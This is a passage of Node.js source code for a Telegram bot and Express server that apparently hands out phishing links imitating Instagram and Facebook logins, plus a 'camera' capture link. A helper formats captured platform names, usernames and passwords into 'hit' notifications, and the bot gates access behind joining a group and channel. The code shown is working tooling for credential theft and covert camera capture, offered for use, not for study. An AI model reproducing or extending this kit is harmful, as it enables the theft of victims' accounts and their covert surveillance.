        res.sendFile(filePath);
    } else {
        res.status(404).send('<h1>Page not found</h1>');
    }
});

// ====================== HELPER FUNCTIONS ======================

function LoveHit(SYloveDaTe, SYloveTiMe, platform, pass, user, dev) {
    return `🖤©🖤 ʷᵉ ʟᴏᴠᴇ ʏᴏᴜ sᴇxʏ ʙᴏʏ ﾂ.🖤ª🖤\n\n🐉⨀-----------------------------------⨀🐉\n↝ ɴᴀᴍᴇ » ${platform}\n📧 ↝ ᴘᴀss » ${user}\n📟 ↝ ᴘᴀssᴡᴏʀᴅ » ${pass}\n⏱ ↝ ᴛɪᴍᴇ » ${SYloveTiMe}\n📝 ↝ ᴅᴀᴛᴇ » ${SYloveDaTe}\n🐉⨀-----------------------------------⨀🐉\n↝ ʙʏ ᴅᴇᴠ » ${dev}`;
}

function MenuLove(firstName, dev, SeXy, LoveTime, message) {
    return `─【 ${dev} 】─\n────────────────────\n         ᴜsᴇʀ ➤ ${firstName} ›\n         ɴᴀᴍᴇ ➤ ${SeXy}  ›\n         ᴍᴏᴅᴇ ➤ Premium User ›\n         ᴏɴʟɪɴᴇ ➤ ${LoveTime}›\n          ────────────────────\n\n             ${message} \n\n────────────────────\n              ─【 𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 】─`;
}

function getUptime() {
    const ut = process.uptime();
    const h = Math.floor(ut / 3600);
    const m = Math.floor((ut % 3600) / 60);
    const s = Math.floor(ut % 60);
    return `${h}h ${m}m ${s}s`;
}

function LoveNotifer(platform, pass, user) {
    const SYloveTiMe = moment().tz("Asia/Kolkata").format('h:mm:ss A');
    const SYloveDaTe = moment().tz("Asia/Kolkata").format('DD/MM/YYYY');
    return LoveHit(SYloveDaTe, SYloveTiMe, platform, pass, user, config.S7);
}

function SYloveMenu(firstName, message) {
    return MenuLove(firstName, config.S7, config.bot, getUptime(), message);
}

async function IsSYLovsToo(userId) {
    try {
        const ch = await S7.getChatMember(config.channelId, userId);
        const gr = await S7.getChatMember(config.groupId, userId);
        const valid = ['creator', 'administrator', 'member', 'restricted'];
        return valid.includes(ch.status) && valid.includes(gr.status);
    } catch (e) {
        return false;
    }
}

// ====================== TELEGRAM BOT ======================

const S7 = new TelegramBot(config.mainToken, { polling: true });

S7.getMe().then((botInfo) => {
    console.log(`✅ Bot Started: ${botInfo.username}`);
}).catch(err => {
    console.error('❌ Bot Start Error:', err.message);
    process.exit(1);
});

// ====================== KEYBOARDS ======================

const LOVESY = {
    inline_keyboard: [
        [{ text: "𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌", callback_data: "gen_instagram" }],
        [{ text: "𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊", callback_data: "gen_facebook" }],
        [{ text: "𝐂𝐀𝐌𝐄𝐑𝐀", callback_data: "gen_camera" }]
    ]
};

const SYBack = {
    inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back" }]]
};

const getRegenMarkup = (platform) => ({
    inline_keyboard: [
        [{ text: `🔄 REGENERATE LINK`, callback_data: `regen_${platform}` }],
        [{ text: "🔙 BACK", callback_data: "back" }]
    ]
});

const protectionButtons = {
    inline_keyboard: [
        [{ text: "Join Group", url: config.group }, { text: "Join Channel", url: config.channel }],
        [{ text: "✅ Check Membership", callback_data: "check_join" }]
    ]
};

// ====================== BOT COMMANDS ======================

async function SendLoveSYMenu(chatId, firstName) {
    const message = '𝙃𝙖𝙫𝙚 𝘼 𝙎𝙚𝙭𝙮 𝘿𝙖𝙮 ☻ ';
    
    try {
        const response = await fetch(`http://localhost:${config.port}/api/bot/random-photo`);
        const data = await response.json();
        
        if (data.success && data.photo) {
            const photoUrl = `http://localhost:${config.port}${data.photo.url}`;
            await S7.sendPhoto(chatId, photoUrl, {
                caption: SYloveMenu(firstName, message),
                parse_mode: 'HTML',
                reply_markup: LOVESY
            });
        } else {
            await S7.sendMessage(chatId, SYloveMenu(firstName, message), {
                parse_mode: 'HTML',
                reply_markup: LOVESY
            });
        }
    } catch (err) {
        await S7.sendMessage(chatId, SYloveMenu(firstName, message), {
            parse_mode: 'HTML',
            reply_markup: LOVESY
        });
    }
}

const protectionMessage = `<b>Access Denied ❌</b>\n\nPlease join our group and channel to use this bot.`;

function SYLoVe(commands) {
    if (!Array.isArray(commands)) commands = [commands];
    S7.on('message', async (msg) => {
        if (!msg.text) return;
        const cmd = msg.text.trim().split(' ')[0].slice(1);
        if (commands.includes(cmd)) {
            try {
                const isMember = await IsSYLovsToo(msg.from.id);
                if (!isMember) {
                    return S7.sendMessage(msg.chat.id, protectionMessage, { 
                        parse_mode: 'HTML', 
                        reply_markup: protectionButtons 
                    });
                }
                await SendLoveSYMenu(msg.chat.id, msg.from.first_name);
            } catch (err) {
                console.error('Command Error:', err.message);
            }
        }
    });
}

SYLoVe(['start', 'menu']);

// ====================== CALLBACK QUERY HANDLER ======================

S7.on('callback_query', async (q) => {
    const uid = q.from.id;
    const mid = q.message.message_id;
    const cid = q.message.chat.id;

    if (q.data === "check_join") {
        const isMember = await IsSYLovsToo(uid);
        if (isMember) {
            await S7.deleteMessage(cid, mid);
            await SendLoveSYMenu(cid, q.from.first_name);
        } else {
            await S7.answerCallbackQuery(q.id, { text: "❌ You have not joined both channels yet!", show_alert: true });
        }
        return;
    }

    if (q.data === "gen_instagram" || q.data === "gen_facebook" || q.data === "gen_camera") {
        const platform = q.data.replace('gen_', '');
        await S7.editMessageCaption(SYloveMenu(q.from.first_name, '𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙇𝙞𝙣𝙠... 🔁'), {
            chat_id: cid,
            message_id: mid,
            parse_mode: 'HTML',
            reply_markup: SYBack
        });
        
        try {
            const response = await fetch(`http://localhost:${config.port}/api/create-link`, {
                method: 'GET',
                headers: { userid: uid, platform: platform }
            });
            const data = await response.json();
            
            const finalMsg = `𝙔𝙤𝙪𝙧 𝙇𝙞𝙣𝙠:\n   ${data.url}`;
            await S7.editMessageCaption(SYloveMenu(q.from.first_name, finalMsg), {
                chat_id: cid,
                message_id: mid,
                parse_mode: 'HTML',
                reply_markup: getRegenMarkup(platform)
            });
        } catch (err) {
            await S7.editMessageCaption(SYloveMenu(q.from.first_name, '❌ Error generating link'), {
                chat_id: cid,
                message_id: mid,
                parse_mode: 'HTML',
                reply_markup: SYBack
            });
        }
    }

    if (q.data === "regen_instagram" || q.data === "regen_facebook" || q.data === "regen_camera") {
        const platform = q.data.replace('regen_', '');
        await S7.editMessageCaption(SYloveMenu(q.from.first_name, '𝙍𝙚𝙜𝙚𝙣𝙚𝙧𝙖𝙩𝙞𝙣𝙜 𝙉𝙚𝙬 𝙇𝙞𝙣𝙠... 🔁'), {
            chat_id: cid,
            message_id: mid,
            parse_mode: 'HTML',
            reply_markup: SYBack
        });
        
        try {
            const response = await fetch(`http://localhost:${config.port}/api/create-link`, {
                method: 'GET',
                headers: { userid: uid, platform: platform }
            });
            const data = await response.json();
            
            const finalMsg = `𝙔𝙤𝙪𝙧 𝙉𝙚𝙬 𝙇𝙞𝙣𝙠:\n   ${data.url}`;
            await S7.editMessageCaption(SYloveMenu(q.from.first_name, finalMsg), {
                chat_id: cid,
                message_id: mid,
                parse_mode: 'HTML',
                reply_markup: getRegenMarkup(platform)
            });
        } catch (err) {
            await S7.editMessageCaption(SYloveMenu(q.from.first_name, '❌ Error generating link'), {
                chat_id: cid,
                message_id: mid,
                parse_mode: 'HTML',
                reply_markup: SYBack
            });
        }
    }

    if (q.data === "back") {
        await SendLoveSYMenu(cid, q.from.first_name);
    }
});

// ====================== START SERVER ======================

app.listen(config.port, () => {
    console.log(`✅ Server running on port ${config.port}`);
    console.log(`📌 Admin Panel: http://localhost:${config.port}/admin`);
    console.log(`🤖 Bot is ready! Send /start to begin.`);
});

// ====================== ERROR HANDLING ======================

process.on('uncaughtException', (err) => {
    console.error('❌ Uncaught Exception:', err.message);
});

process.on('unhandledRejection', (reason) => {
    console.error('❌ Unhandled Rejection:', reason);
});
